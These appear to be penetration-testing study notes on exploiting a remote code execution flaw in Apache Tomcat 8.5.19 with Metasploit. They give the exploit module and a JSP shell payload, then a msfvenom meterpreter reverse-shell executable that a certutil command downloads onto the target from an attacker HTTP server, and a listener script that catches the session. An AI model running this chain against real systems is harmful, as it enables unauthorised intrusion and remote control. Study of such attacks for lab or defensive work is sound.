## Apache Tomcat (Tomcat server)
* Free+ Open source Java servlet web server.
* Use the HTTP protocol to communicate
* Typically operates on TCP port 8080 or 443.
* **Difference between HTTP web server & Apache Tomcat**
  * Apache Tomcat: Used to build and host dynamic web apps based on the Java platform
  * HTTP web server: Used to host static/ dynamic websites developed in PHP.
 
* **What's the vulnerability**
  * Apache Tomcat V8.5.19 is vulnerable to a remote code execution vulnerability that allows to execute a JSP payload in order to gain access.
  * MSF exploit module is pre-built in msfconsole
 
* PRACTICAL
* `service postgresql start && msfconsole`
* `workspace -a [name]`
* `setg rhosts [IP]`
* `db_nmap -sS -sV -O [IP]`
* `search type:exploit tomcat`
* `use exploit/multi/http/tomcat_jsp_upload_bypass`
    * This module uploads a JSP payload and executes it.
* `set payload java/jsp_shell_bind_tcp`
    * Payload needs to be set to get a reverse shell, as it provides the way to set LHOST and LPORT
* `run` --> This will give a shell but not a meterpreter session
* ***
* We will try to get a meterpreter session instead of a shell
* This can be done by generate a payload with msfvenom --> Upload to the target on the target through the shell session ---> Receive a meterpreter session through a listener.
* `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[attacker'sIP] LPORT=port] -f exe > meterpreter.exe`
* `sudo python -m SimpleHTTPServer 80`
* Now on the target machine where we got a shell session:
  * `certutil -urlcache -f http://10.10.21.2/meterpreter.exe > meterpreter.exe`
  * `dir` --> We should be able to see the downloaded payload
 
* Go back to the attacker's machine where server was running at port 80 and turn it off
* `vim handler.rc`
* `use multi/handler set payload windows/meterpreter/reverse_tcp set lhost [IP] set lport [port] run`
* `msfconsole -r handler.rc`
* 

* **Extrazz** :
  * Meterpreter session has higher functionality than a shell.
